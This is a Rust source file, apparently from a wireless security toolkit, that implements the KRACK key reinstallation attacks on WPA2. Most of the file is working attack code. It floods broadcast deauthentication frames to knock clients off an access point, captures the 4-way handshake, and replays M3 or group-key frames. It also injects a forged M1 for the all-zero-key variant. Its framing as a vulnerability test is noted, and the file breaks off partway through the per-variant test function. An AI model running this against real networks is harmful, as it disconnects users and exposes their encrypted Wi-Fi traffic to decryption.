//! KRACK — Key Reinstallation Attacks (CVE-2017-13077 through CVE-2017-13088).
//!
//! All 11 variants + zeroed-TK variant for wpa_supplicant v2.4+.
//!
//! **TEST mode** (single adapter): captures the 4-way handshake between AP and
//! client, replays M3 (or Group M1, FT Reassoc, etc.), then monitors encrypted
//! frames for PN (Packet Number) reuse — proving the PTK/GTK was reinstalled.
//!
//! **FULL mode** (dual adapter MitM): uses the shared MitM engine for reliable
//! key reinstallation via M4 blocking. Not yet implemented — requires MitM engine.
//!
//! Variants:
//!   CVE-2017-13077: 4-way PTK — replay M3, reinstall PTK-TK
//!   CVE-2017-13078: 4-way GTK — replay M3, reinstall GTK
//!   CVE-2017-13079: 4-way IGTK — replay M3, reinstall IGTK
//!   CVE-2017-13080: Group GTK — replay Group M1, reinstall GTK
//!   CVE-2017-13081: Group IGTK — replay Group M1, reinstall IGTK
//!   CVE-2017-13082: FT — replay FT Reassoc Request, reinstall PTK
//!   CVE-2017-13084: PeerKey — replay SMK M3, reinstall STK (deprecated)
//!   CVE-2017-13086: TDLS — replay TDLS Setup Confirm, reinstall TPK
//!   CVE-2017-13087: WNM-GTK — replay WNM Sleep Response, reinstall GTK
//!   CVE-2017-13088: WNM-IGTK — replay WNM Sleep Response, reinstall IGTK
//!   Zeroed-TK: wpa_supplicant v2.4+ — inject M1 + replay M3 → all-zero key
//!
//! Architecture (SharedAdapter):
//!   The attack locks the channel, captures a handshake (deauthing to force
//!   reconnection if configured), replays the relevant frame, then monitors
//!   for nonce reuse in encrypted data frames from the client.
//!
//! Ported from `wifi-map/libwifikit/attacks/attack_krack.c`.

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};

use crate::adapter::SharedAdapter;
use crate::core::{EventRing, MacAddress, TxFlags, TxOptions, TxRate};
use crate::store::Ap;
use crate::protocol::frames;
use crate::protocol::ieee80211::ReasonCode;

// ═══════════════════════════════════════════════════════════════════════════════
//  KRACK Variant — one per CVE
// ═══════════════════════════════════════════════════════════════════════════════

/// The 11 KRACK attack variants.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum KrackVariant {
    /// CVE-2017-13077: 4-way handshake PTK reinstallation via M3 replay.
    FourWayPtk,
    /// CVE-2017-13078: 4-way handshake GTK reinstallation via M3 replay.
    FourWayGtk,
    /// CVE-2017-13079: 4-way handshake IGTK reinstallation via M3 replay.
    FourWayIgtk,
    /// CVE-2017-13080: Group key GTK reinstallation via Group M1 replay.
    GroupGtk,
    /// CVE-2017-13081: Group key IGTK reinstallation via Group M1 replay.
    GroupIgtk,
    /// CVE-2017-13082: FT (Fast BSS Transition) PTK reinstallation.
    Ft,
    /// CVE-2017-13084: PeerKey STK reinstallation via SMK M3 replay (deprecated).
    PeerKey,
    /// CVE-2017-13086: TDLS TPK reinstallation via Setup Confirm replay.
    Tdls,
    /// CVE-2017-13087: WNM Sleep Mode GTK reinstallation.
    WnmGtk,
    /// CVE-2017-13088: WNM Sleep Mode IGTK reinstallation.
    WnmIgtk,
    /// All-zero TK: wpa_supplicant v2.4+ — M1 inject + M3 replay → zeroed key.
    ZeroedTk,
}

impl KrackVariant {
    /// Human-readable short name for CLI display.
    pub fn label(&self) -> &'static str {
        match self {
            Self::FourWayPtk => "4way-ptk",
            Self::FourWayGtk => "4way-gtk",
            Self::FourWayIgtk => "4way-igtk",
            Self::GroupGtk => "group-gtk",
            Self::GroupIgtk => "group-igtk",
            Self::Ft => "ft",
            Self::PeerKey => "peerkey",
            Self::Tdls => "tdls",
            Self::WnmGtk => "wnm-gtk",
            Self::WnmIgtk => "wnm-igtk",
            Self::ZeroedTk => "zeroed-tk",
        }
    }

    /// CVE identifier.
    pub fn cve(&self) -> &'static str {
        match self {
            Self::FourWayPtk => "CVE-2017-13077",
            Self::FourWayGtk => "CVE-2017-13078",
            Self::FourWayIgtk => "CVE-2017-13079",
            Self::GroupGtk => "CVE-2017-13080",
            Self::GroupIgtk => "CVE-2017-13081",
            Self::Ft => "CVE-2017-13082",
            Self::PeerKey => "CVE-2017-13084",
            Self::Tdls => "CVE-2017-13086",
            Self::WnmGtk => "CVE-2017-13087",
            Self::WnmIgtk => "CVE-2017-13088",
            Self::ZeroedTk => "wpa_supplicant",
        }
    }

    /// Description of the vulnerability.
    pub fn description(&self) -> &'static str {
        match self {
            Self::FourWayPtk => "Replay M3 → reinstall PTK-TK (pairwise key)",
            Self::FourWayGtk => "Replay M3 → reinstall GTK (group key)",
            Self::FourWayIgtk => "Replay M3 → reinstall IGTK (integrity key)",
            Self::GroupGtk => "Replay Group M1 → reinstall GTK",
            Self::GroupIgtk => "Replay Group M1 → reinstall IGTK",
            Self::Ft => "Replay FT Reassoc Request → reinstall PTK (802.11r)",
            Self::PeerKey => "Replay SMK M3 → reinstall STK (deprecated protocol)",
            Self::Tdls => "Replay TDLS Setup Confirm → reinstall TPK",
            Self::WnmGtk => "Replay WNM Sleep Response → reinstall GTK",
            Self::WnmIgtk => "Replay WNM Sleep Response → reinstall IGTK",
            Self::ZeroedTk => "M1 inject + M3 replay → all-zero TK (wpa_supplicant v2.4+)",
        }
    }

    /// What frame this variant replays.
    pub fn replay_frame(&self) -> &'static str {
        match self {
            Self::FourWayPtk | Self::FourWayGtk | Self::FourWayIgtk => "EAPOL M3",
            Self::GroupGtk | Self::GroupIgtk => "Group Key M1",
            Self::Ft => "FT Reassociation Request",
            Self::PeerKey => "PeerKey SMK M3",
            Self::Tdls => "TDLS Setup Confirm",
            Self::WnmGtk | Self::WnmIgtk => "WNM Sleep Mode Response",
            Self::ZeroedTk => "forged M1 + EAPOL M3",
        }
    }

    /// Whether this variant needs a special captured frame (FT/TDLS/WNM/PeerKey).
    pub fn needs_special_capture(&self) -> bool {
        matches!(self, Self::Ft | Self::PeerKey | Self::Tdls | Self::WnmGtk | Self::WnmIgtk)
    }

    /// Whether this variant needs Group M1 (vs regular M3).
    pub fn needs_group_m1(&self) -> bool {
        matches!(self, Self::GroupGtk | Self::GroupIgtk)
    }

    /// Parse from string (CLI input).
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "ptk" | "4way-ptk" | "4way" | "13077" | "cve-2017-13077" => Some(Self::FourWayPtk),
            "gtk" | "4way-gtk" | "13078" | "cve-2017-13078" => Some(Self::FourWayGtk),
            "igtk" | "4way-igtk" | "13079" | "cve-2017-13079" => Some(Self::FourWayIgtk),
            "group" | "group-gtk" | "13080" | "cve-2017-13080" => Some(Self::GroupGtk),
            "group-igtk" | "13081" | "cve-2017-13081" => Some(Self::GroupIgtk),
            "ft" | "13082" | "cve-2017-13082" => Some(Self::Ft),
            "peerkey" | "13084" | "cve-2017-13084" => Some(Self::PeerKey),
            "tdls" | "13086" | "cve-2017-13086" => Some(Self::Tdls),
            "wnm-gtk" | "wnm" | "13087" | "cve-2017-13087" => Some(Self::WnmGtk),
            "wnm-igtk" | "13088" | "cve-2017-13088" => Some(Self::WnmIgtk),
            "zeroed" | "zeroed-tk" | "zero" => Some(Self::ZeroedTk),
            _ => None,
        }
    }

    /// All 11 variants in CVE order.
    pub fn all() -> &'static [KrackVariant] {
        &[
            Self::FourWayPtk, Self::FourWayGtk, Self::FourWayIgtk,
            Self::GroupGtk, Self::GroupIgtk,
            Self::Ft, Self::PeerKey, Self::Tdls,
            Self::WnmGtk, Self::WnmIgtk, Self::ZeroedTk,
        ]
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  KRACK Parameters
// ═══════════════════════════════════════════════════════════════════════════════

/// Configuration for the KRACK attack.
#[allow(dead_code)]
#[derive(Clone, Debug)]
pub struct KrackParams {
    // === Attack selection ===
    /// Which variant to test. None = all. Default: None.
    pub variant: Option<KrackVariant>,

    // === Replay ===
    /// Number of M3 replays per variant. Default: 3.
    pub m3_replay_count: u32,
    /// Delay between M3 replays. Default: 50ms.
    pub m3_replay_delay: Duration,

    // === Timing ===
    /// Timeout waiting for handshake capture. Default: 15s.
    pub handshake_timeout: Duration,
    /// Duration to monitor for nonce reuse after replay. Default: 5s.
    pub monitor_duration: Duration,
    /// Overall attack timeout (0 = no limit). Default: 0.
    pub timeout: Duration,
    /// Wait after channel lock for PLL/AGC stabilization. Default: 50ms.
    pub channel_settle: Duration,
    /// RX poll timeout slice for frame reception loops. Default: 200ms.
    pub rx_poll_timeout: Duration,

    // === Deauth ===
    /// Send deauth to force client reconnection (for handshake capture). Default: true.
    pub deauth_to_reconnect: bool,
    /// Number of deauth frames to send. Default: 5.
    pub deauth_count: u8,
    /// Delay between deauth frames. Default: 5ms.
    pub deauth_delay: Duration,

    // === MitM (FULL mode) ===
    /// Rogue channel for MitM. 0 = auto. Default: 0.
    pub rogue_channel: u8,
    /// CSA beacons for client lure. Default: 10.
    pub csa_beacon_count: u16,
    /// CSA beacon interval. Default: 100ms.
    pub csa_interval: Duration,
}

impl Default for KrackParams {
    fn default() -> Self {
        Self {
            variant: None,
            m3_replay_count: 3,
            m3_replay_delay: Duration::from_millis(50),
            handshake_timeout: Duration::from_secs(15),
            monitor_duration: Duration::from_secs(5),
            timeout: Duration::ZERO,
            channel_settle: Duration::from_millis(50),
            rx_poll_timeout: Duration::from_millis(200),
            deauth_to_reconnect: true,
            deauth_count: 5,
            deauth_delay: Duration::from_millis(5),
            rogue_channel: 0,
            csa_beacon_count: 10,
            csa_interval: Duration::from_millis(100),
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  KRACK Phase
// ═══════════════════════════════════════════════════════════════════════════════

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum KrackPhase {
    Idle,
    ChannelLock,
    DeauthSent,
    CapturingHandshake,
    Replaying,
    Monitoring,
    Done,
}

impl Default for KrackPhase {
    fn default() -> Self { Self::Idle }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Per-variant result
// ═══════════════════════════════════════════════════════════════════════════════

#[allow(dead_code)]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum KrackVerdict {
    Pending,
    Testing,
    /// Nonce reuse detected — target IS vulnerable.
    Vulnerable,
    /// No nonce reuse — target is NOT vulnerable (patched or timing).
    NotVulnerable,
    /// Skipped (required frame not captured, e.g., no FT support).
    Skipped,
    Error,
}

impl Default for KrackVerdict {
    fn default() -> Self { Self::Pending }
}

#[derive(Debug, Clone)]
pub struct KrackTestResult {
    pub variant: KrackVariant,
    pub verdict: KrackVerdict,
    pub replays_sent: u32,
    pub nonce_reuses: u32,
    pub detail: String,
    pub elapsed: Duration,
}

impl KrackTestResult {
    pub fn new(variant: KrackVariant) -> Self {
        Self {
            variant,
            verdict: KrackVerdict::Pending,
            replays_sent: 0,
            nonce_reuses: 0,
            detail: String::new(),
            elapsed: Duration::ZERO,
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  KRACK Final Result — aggregate result after completion
// ═══════════════════════════════════════════════════════════════════════════════

/// Aggregate result produced when the KRACK attack completes.
#[derive(Debug, Clone, Default)]
pub struct KrackFinalResult {
    /// Per-variant results.
    pub results: Vec<KrackTestResult>,
    /// Number of variants that were actually tested (not skipped).
    pub variants_tested: u32,
    /// Number of variants found vulnerable.
    pub variants_vulnerable: u32,
    /// Total elapsed time for the entire attack.
    pub elapsed: Duration,
}

// ═══════════════════════════════════════════════════════════════════════════════
//  KRACK Info — real-time state snapshot
// ═══════════════════════════════════════════════════════════════════════════════

#[derive(Debug, Clone)]
pub struct KrackInfo {
    pub phase: KrackPhase,
    pub running: bool,
    pub target_bssid: MacAddress,
    pub target_ssid: String,
    pub target_channel: u8,
    pub client_mac: Option<MacAddress>,
    pub current_variant: Option<KrackVariant>,
    pub variant_index: u32,
    pub variant_total: u32,
    pub handshake_captured: bool,
    pub m3_replays_sent: u32,
    pub nonce_reuses_total: u32,
    pub variants_tested: u32,
    pub variants_vulnerable: u32,
    pub variants_skipped: u32,
    pub deauths_sent: u32,
    pub frames_sent: u64,
    pub frames_received: u64,
    pub start_time: Instant,
    pub elapsed: Duration,
    pub frames_per_sec: f64,

    // === TX Feedback (ACK/NACK from firmware) ===
    pub tx_feedback: crate::core::TxFeedbackSnapshot,

    pub results: Vec<KrackTestResult>,
}

impl Default for KrackInfo {
    fn default() -> Self {
        Self {
            phase: KrackPhase::Idle,
            running: false,
            target_bssid: MacAddress::ZERO,
            target_ssid: String::new(),
            target_channel: 0,
            client_mac: None,
            current_variant: None,
            variant_index: 0,
            variant_total: 0,
            handshake_captured: false,
            m3_replays_sent: 0,
            nonce_reuses_total: 0,
            variants_tested: 0,
            variants_vulnerable: 0,
            variants_skipped: 0,
            deauths_sent: 0,
            frames_sent: 0,
            frames_received: 0,
            start_time: Instant::now(),
            elapsed: Duration::ZERO,
            frames_per_sec: 0.0,
            tx_feedback: Default::default(),
            results: Vec::new(),
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  KRACK Events
// ═══════════════════════════════════════════════════════════════════════════════

#[allow(dead_code)]
#[derive(Debug, Clone)]
pub struct KrackEvent {
    pub seq: u64,
    pub timestamp: Duration,
    pub kind: KrackEventKind,
}

#[derive(Debug, Clone)]
pub enum KrackEventKind {
    AttackStarted { bssid: MacAddress, ssid: String, channel: u8, variant_count: u32 },
    ChannelLocked { channel: u8 },
    DeauthSent { target: MacAddress, count: u8 },
    HandshakeMessage { message: u8, from_ap: bool },
    HandshakeCaptured { has_m1: bool, has_m3: bool, has_group_m1: bool },
    ClientLocked { mac: MacAddress },
    VariantStarted { variant: KrackVariant, index: u32, total: u32 },
    M3Replayed { variant: KrackVariant, count: u32 },
    NonceReuse { variant: KrackVariant, old_pn: u64, new_pn: u64, count: u32 },
    VariantComplete { variant: KrackVariant, verdict: KrackVerdict, nonce_reuses: u32, elapsed_ms: u64 },
    VariantSkipped { variant: KrackVariant, reason: String },
    AttackComplete { tested: u32, vulnerable: u32, skipped: u32, total: u32, elapsed: Duration },
    ChannelUnlocked,
    Error { message: String },
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Captured handshake frames storage
// ═══════════════════════════════════════════════════════════════════════════════

/// Captured frames from the handshake for replay.
#[derive(Debug, Clone, Default)]
struct CapturedFrames {
    m1: Option<Vec<u8>>,
    m3: Option<Vec<u8>>,
    group_m1: Option<Vec<u8>>,
    ft_reassoc: Option<Vec<u8>>,
    tdls_confirm: Option<Vec<u8>>,
    wnm_sleep_resp: Option<Vec<u8>>,
    peerkey_m3: Option<Vec<u8>>,
    anonce: [u8; 32],
    snonce: [u8; 32],
    client_mac: Option<MacAddress>,
}

// ═══════════════════════════════════════════════════════════════════════════════
//  KrackAttack — the attack engine
// ═══════════════════════════════════════════════════════════════════════════════

pub struct KrackAttack {
    params: KrackParams,
    info: Arc<Mutex<KrackInfo>>,
    events: Arc<EventRing<KrackEvent>>,
    running: Arc<AtomicBool>,
    done: Arc<AtomicBool>,
}

impl KrackAttack {
    pub fn new(params: KrackParams) -> Self {
        Self {
            params,
            info: Arc::new(Mutex::new(KrackInfo::default())),
            events: Arc::new(EventRing::new(1024)),
            running: Arc::new(AtomicBool::new(false)),
            done: Arc::new(AtomicBool::new(false)),
        }
    }

    pub fn start(&self, shared: SharedAdapter, target: Ap) {
        let info = Arc::clone(&self.info);
        let events = Arc::clone(&self.events);
        let running = Arc::clone(&self.running);
        let done = Arc::clone(&self.done);
        let params = self.params.clone();

        let variants: Vec<KrackVariant> = match params.variant {
            Some(v) => vec![v],
            None => KrackVariant::all().to_vec(),
        };

        running.store(true, Ordering::SeqCst);
        done.store(false, Ordering::SeqCst);
        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.running = true;
            info.start_time = Instant::now();
            info.phase = KrackPhase::ChannelLock;
            info.target_bssid = target.bssid;
            info.target_ssid = target.ssid.clone();
            info.target_channel = target.channel;
            info.variant_total = variants.len() as u32;
            info.results = variants.iter().map(|v| KrackTestResult::new(*v)).collect();
        }

        thread::Builder::new()
            .name("krack".into())
            .spawn(move || {
                let reader = shared.subscribe("krack");
                run_krack_attack(&shared, &reader, &target, &variants, &params, &info, &events, &running);
                running.store(false, Ordering::SeqCst);
                done.store(true, Ordering::SeqCst);
                {
                    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                    info.running = false;
                    info.phase = KrackPhase::Done;
                }
            })
            .expect("failed to spawn krack thread");
    }

    pub fn signal_stop(&self) { self.running.store(false, Ordering::SeqCst); }
    pub fn is_done(&self) -> bool { self.done.load(Ordering::SeqCst) }
    #[allow(dead_code)]
    pub fn is_running(&self) -> bool { self.running.load(Ordering::SeqCst) }
    pub fn info(&self) -> KrackInfo { self.info.lock().unwrap_or_else(|e| e.into_inner()).clone() }
    pub fn events(&self) -> Vec<KrackEvent> { self.events.drain() }
    #[allow(dead_code)]
    pub fn name(&self) -> &'static str { "krack" }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Attack logic
// ═══════════════════════════════════════════════════════════════════════════════

fn run_krack_attack(
    shared: &SharedAdapter,
    reader: &crate::pipeline::PipelineSubscriber,
    target: &Ap,
    variants: &[KrackVariant],
    params: &KrackParams,
    info: &Arc<Mutex<KrackInfo>>,
    events: &Arc<EventRing<KrackEvent>>,
    running: &Arc<AtomicBool>,
) {
    let start = Instant::now();
    let _our_mac = shared.mac();
    let tx_fb = shared.tx_feedback();
    tx_fb.reset();
    // TX options optimized for range — own MAC so ACK feedback works
    let tx_opts = TxOptions {
        rate: if target.channel <= 14 { TxRate::Cck1m } else { TxRate::Ofdm6m },
        retries: 12,
        flags: TxFlags::WANT_ACK | TxFlags::LDPC | TxFlags::STBC,
        ..Default::default()
    };

    push_event(events, start, KrackEventKind::AttackStarted {
        bssid: target.bssid,
        ssid: target.ssid.clone(),
        channel: target.channel,
        variant_count: variants.len() as u32,
    });

    // Lock channel
    if let Err(e) = shared.lock_channel(target.channel, "krack") {
        push_event(events, start, KrackEventKind::Error {
            message: format!("channel lock to ch{} failed: {e}", target.channel),
        });
        return;
    }
    push_event(events, start, KrackEventKind::ChannelLocked { channel: target.channel });
    thread::sleep(params.channel_settle);

    // Step 1: Deauth client to force reconnection (if configured)
    if params.deauth_to_reconnect {
        update_phase(info, KrackPhase::DeauthSent);
        // Broadcast deauth from AP to kick all clients
        for _ in 0..params.deauth_count {
            if !running.load(Ordering::SeqCst) { break; }
            let deauth = frames::build_deauth(
                &target.bssid, &MacAddress::BROADCAST, &target.bssid,
                ReasonCode::Class3FromNonAssoc,
            );
            if shared.tx_frame(&deauth, &tx_opts).is_ok() {
                let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                info.frames_sent += 1;
                info.deauths_sent += 1;
            }
            thread::sleep(params.deauth_delay);
        }
        push_event(events, start, KrackEventKind::DeauthSent {
            target: MacAddress::BROADCAST,
            count: params.deauth_count,
        });
    }

    // Step 2: Capture 4-way handshake
    update_phase(info, KrackPhase::CapturingHandshake);
    let mut captured = CapturedFrames::default();
    let capture_ok = capture_handshake(
        reader, &target.bssid, params, &mut captured,
        info, events, running, start,
    );

    if !capture_ok && !running.load(Ordering::SeqCst) {
        shared.unlock_channel();
        push_event(events, start, KrackEventKind::ChannelUnlocked);
        return;
    }

    let handshake_ok = captured.m3.is_some();
    {
        let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
        info.handshake_captured = handshake_ok;
        info.client_mac = captured.client_mac;
    }

    if handshake_ok {
        push_event(events, start, KrackEventKind::HandshakeCaptured {
            has_m1: captured.m1.is_some(),
            has_m3: true,
            has_group_m1: captured.group_m1.is_some(),
        });
    }

    // Step 3: Execute variants
    let mut total_tested: u32 = 0;
    let mut total_vulnerable: u32 = 0;
    let mut total_skipped: u32 = 0;

    for (idx, variant) in variants.iter().enumerate() {
        if !running.load(Ordering::SeqCst) { break; }
        if params.timeout > Duration::ZERO && start.elapsed() >= params.timeout { break; }

        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.variant_index = idx as u32 + 1;
            info.current_variant = Some(*variant);
            info.elapsed = start.elapsed();
        }

        push_event(events, start, KrackEventKind::VariantStarted {
            variant: *variant,
            index: idx as u32 + 1,
            total: variants.len() as u32,
        });

        // Check if we have the required frame
        let can_test = match variant {
            KrackVariant::FourWayPtk | KrackVariant::FourWayGtk |
            KrackVariant::FourWayIgtk | KrackVariant::ZeroedTk => captured.m3.is_some(),
            KrackVariant::GroupGtk | KrackVariant::GroupIgtk => captured.group_m1.is_some(),
            KrackVariant::Ft => captured.ft_reassoc.is_some(),
            KrackVariant::PeerKey => captured.peerkey_m3.is_some(),
            KrackVariant::Tdls => captured.tdls_confirm.is_some(),
            KrackVariant::WnmGtk | KrackVariant::WnmIgtk => captured.wnm_sleep_resp.is_some(),
        };

        if !can_test {
            let reason = format!("{} not captured — required frame not seen", variant.replay_frame());
            push_event(events, start, KrackEventKind::VariantSkipped {
                variant: *variant,
                reason: reason.clone(),
            });
            total_skipped += 1;
            {
                let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                info.variants_skipped = total_skipped;
                if let Some(r) = info.results.iter_mut().find(|r| r.variant == *variant) {
                    r.verdict = KrackVerdict::Skipped;
                    r.detail = reason;
                }
            }
            push_event(events, start, KrackEventKind::VariantComplete {
                variant: *variant, verdict: KrackVerdict::Skipped,
                nonce_reuses: 0, elapsed_ms: 0,
            });
            continue;
        }

        let result = test_variant(
            shared, reader, &target.bssid, *variant, params, &captured,
            info, events, running, start, &tx_opts,
        );

        total_tested += 1;
        if result.verdict == KrackVerdict::Vulnerable {
            total_vulnerable += 1;
        }

        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.variants_tested = total_tested;
            info.variants_vulnerable = total_vulnerable;
            info.nonce_reuses_total += result.nonce_reuses;
            if let Some(r) = info.results.iter_mut().find(|r| r.variant == *variant) {
                *r = result.clone();
            }
        }

        push_event(events, start, KrackEventKind::VariantComplete {
            variant: *variant,
            verdict: result.verdict,
            nonce_reuses: result.nonce_reuses,
            elapsed_ms: result.elapsed.as_millis() as u64,
        });

        // For 4-way variants after the first, we'd ideally recapture the handshake.
        // In TEST mode, we deauth again to get a fresh handshake for the next variant.
        if idx + 1 < variants.len() && params.deauth_to_reconnect {
            let next = variants[idx + 1];
            if !next.needs_special_capture() && !next.needs_group_m1() {
                // Deauth to force fresh handshake
                for _ in 0..params.deauth_count {
                    if !running.load(Ordering::SeqCst) { break; }
                    let deauth = frames::build_deauth(
                        &target.bssid, &MacAddress::BROADCAST, &target.bssid,
                        ReasonCode::Class3FromNonAssoc,
                    );
                    let _ = shared.tx_frame(&deauth, &tx_opts);
                    thread::sleep(params.deauth_delay);
                }

                // Re-capture handshake
                update_phase(info, KrackPhase::CapturingHandshake);
                let mut new_captured = CapturedFrames::default();
                let ok = capture_handshake(
                    reader, &target.bssid, params, &mut new_captured,
                    info, events, running, start,
                );
                if ok && new_captured.m3.is_some() {
                    captured.m1 = new_captured.m1;
                    captured.m3 = new_captured.m3;
                    if new_captured.group_m1.is_some() {
                        captured.group_m1 = new_captured.group_m1;
                    }
                    captured.client_mac = new_captured.client_mac;
                }
            }
        }
    }

    shared.unlock_channel();
    push_event(events, start, KrackEventKind::ChannelUnlocked);

    let elapsed = start.elapsed();
    push_event(events, start, KrackEventKind::AttackComplete {
        tested: total_tested, vulnerable: total_vulnerable,
        skipped: total_skipped, total: variants.len() as u32, elapsed,
    });

    {
        let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
        info.elapsed = elapsed;
        let secs = elapsed.as_secs_f64();
        if secs > 0.0 {
            info.frames_per_sec = (info.frames_sent + info.frames_received) as f64 / secs;
        }
        info.tx_feedback = tx_fb.snapshot();
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Handshake capture
// ═══════════════════════════════════════════════════════════════════════════════

/// Capture a 4-way handshake by monitoring EAPOL frames.
/// Returns true if at least M3 was captured.
fn capture_handshake(
    reader: &crate::pipeline::PipelineSubscriber,
    bssid: &MacAddress,
    params: &KrackParams,
    captured: &mut CapturedFrames,
    info: &Arc<Mutex<KrackInfo>>,
    events: &Arc<EventRing<KrackEvent>>,
    running: &Arc<AtomicBool>,
    attack_start: Instant,
) -> bool {
    let deadline = Instant::now() + params.handshake_timeout;
    let bssid_bytes = bssid.as_bytes();

    while running.load(Ordering::SeqCst) {
        let now = Instant::now();
        if now >= deadline { return captured.m3.is_some(); }

        let remaining = deadline - now;
        let rx_timeout = remaining.min(params.rx_poll_timeout);

        match reader.recv_timeout(rx_timeout) {
            Some(frame) => {
                {
                    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                    info.frames_received += 1;
                    info.elapsed = info.start_time.elapsed();
                }

                // Check for EAPOL data frames involving our AP
                if let Some(msg_num) = extract_eapol_message(&frame.raw, bssid_bytes) {
                    push_event(events, attack_start, KrackEventKind::HandshakeMessage {
                        message: msg_num,
                        from_ap: msg_num == 1 || msg_num == 3 || msg_num == 5,
                    });

                    match msg_num {
                        1 => {
                            captured.m1 = Some(frame.raw.to_vec());
                            // Extract ANonce (offset 17 in EAPOL-Key body)
                            if let Some(anonce) = extract_nonce(&frame.raw) {
                                captured.anonce.copy_from_slice(&anonce);
                            }
                            // Lock client MAC from M1 destination
                            if captured.client_mac.is_none() {
                                if let Some(client) = frame.addr1 {
                                    captured.client_mac = Some(client);
                                    push_event(events, attack_start, KrackEventKind::ClientLocked {
                                        mac: client,
                                    });
                                    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                                    info.client_mac = Some(client);
                                }
                            }
                        }
                        2 => {
                            if let Some(snonce) = extract_nonce(&frame.raw) {
                                captured.snonce.copy_from_slice(&snonce);
                            }
                        }
                        3 => {
                            captured.m3 = Some(frame.raw.to_vec());
                        }
                        4 => {
                            // Full handshake complete
                            if captured.m3.is_some() {
                                return true;
                            }
                        }
                        5 => {
                            captured.group_m1 = Some(frame.raw.to_vec());
                        }
                        _ => {}
                    }
                }
            }
            None => continue,
        }
    }

    captured.m3.is_some()
}

/// Extract EAPOL message number from a data frame containing EAPOL-Key.
/// Returns message number (1-6) or None.
fn extract_eapol_message(data: &[u8], bssid: &[u8]) -> Option<u8> {
    if data.len() < 30 { return None; }

    let fc_low = data[0];
    let frame_type_val = (fc_low >> 2) & 0x03;
    if frame_type_val != 2 { return None; } // Not data

    // Check AP involvement
    let involves_ap = data[4..10] == *bssid || data[10..16] == *bssid || data[16..22] == *bssid;
    if !involves_ap { return None; }

    let has_qos = (fc_low >> 4) & 0x0F >= 8;
    let hdr_len = if has_qos { 26 } else { 24 };
    if data.len() < hdr_len + 8 + 7 { return None; }

    let llc = &data[hdr_len..];
    // LLC/SNAP + EAPOL EtherType check
    if llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03 ||
       llc[6] != 0x88 || llc[7] != 0x8E { return None; }

    let eapol = &llc[8..];
    if eapol.len() < 7 { return None; }
    if eapol[1] != 3 { return None; } // Not EAPOL-Key

    let key_info = (eapol[5] as u16) << 8 | eapol[6] as u16;
    let pairwise = key_info & (1 << 3) != 0;
    let install = key_info & (1 << 6) != 0;
    let ack = key_info & (1 << 7) != 0;
    let mic = key_info & (1 << 8) != 0;
    let secure = key_info & (1 << 9) != 0;

    if !pairwise {
        if ack && mic { return Some(5); } // Group M1
        if !ack && mic { return Some(6); } // Group M2
        return None;
    }

    if ack && !mic { return Some(1); }              // M1
    if !ack && mic && !secure { return Some(2); }   // M2
    if ack && mic && secure && install { return Some(3); } // M3
    if !ack && mic && secure { return Some(4); }    // M4
    None
}

/// Extract nonce (ANonce or SNonce) from an EAPOL-Key frame.
/// The nonce is at offset 17 in the EAPOL-Key body.
fn extract_nonce(data: &[u8]) -> Option<[u8; 32]> {
    let fc_low = data[0];
    let has_qos = (fc_low >> 4) & 0x0F >= 8;
    let hdr_len = if has_qos { 26 } else { 24 };
    // LLC/SNAP (8) + EAPOL header (4) + Key Descriptor (1) + Key Info (2) + Key Length (2) +
    // Replay Counter (8) + Nonce (32) = 57 bytes after hdr
    if data.len() < hdr_len + 8 + 4 + 1 + 2 + 2 + 8 + 32 { return None; }

    let eapol = &data[hdr_len + 8..];
    if eapol.len() < 51 { return None; }

    let mut nonce = [0u8; 32];
    nonce.copy_from_slice(&eapol[17..49]);
    Some(nonce)
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Per-variant test
// ═══════════════════════════════════════════════════════════════════════════════

fn test_variant(
    shared: &SharedAdapter,
    reader: &crate::pipeline::PipelineSubscriber,
    bssid: &MacAddress,
    variant: KrackVariant,
    params: &KrackParams,
    captured: &CapturedFrames,
    info: &Arc<Mutex<KrackInfo>>,
    events: &Arc<EventRing<KrackEvent>>,
    running: &Arc<AtomicBool>,
    attack_start: Instant,
    tx_opts: &TxOptions,
) -> KrackTestResult {
    let test_start = Instant::now();
    let mut result = KrackTestResult::new(variant);
    result.verdict = KrackVerdict::Testing;

    update_phase(info, KrackPhase::Replaying);

    // For zeroed-TK, inject forged M1 first
    if variant == KrackVariant::ZeroedTk {
        if let Some(m1) = &captured.m1 {
            let _ = shared.tx_frame(m1, tx_opts);
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.frames_sent += 1;
            thread::sleep(Duration::from_millis(10));
        }
    }

    // Get the replay frame
    let replay_frame = match variant {
        KrackVariant::FourWayPtk | KrackVariant::FourWayGtk |
        KrackVariant::FourWayIgtk | KrackVariant::ZeroedTk => captured.m3.as_ref(),
        KrackVariant::GroupGtk | KrackVariant::GroupIgtk => captured.group_m1.as_ref(),
        KrackVariant::Ft => captured.ft_reassoc.as_ref(),
        KrackVariant::PeerKey => captured.peerkey_m3.as_ref(),
        KrackVariant::Tdls => captured.tdls_confirm.as_ref(),
